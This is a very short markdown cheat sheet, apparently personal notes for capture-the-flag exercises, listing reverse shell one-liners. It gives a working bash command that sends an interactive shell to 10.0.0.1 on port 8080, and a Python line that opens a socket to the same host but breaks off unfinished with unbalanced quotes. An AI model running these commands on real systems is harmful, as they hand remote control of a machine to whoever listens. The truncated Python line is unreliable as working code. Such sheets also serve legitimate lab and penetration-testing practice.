# My Personal list of CTF commands

## Reverse Shell Cheat Sheet

### Bash

```bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

### Python

```python
python -c 'import socket, subprocess, os; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.connect(("10.0.0.1", 1234))
```
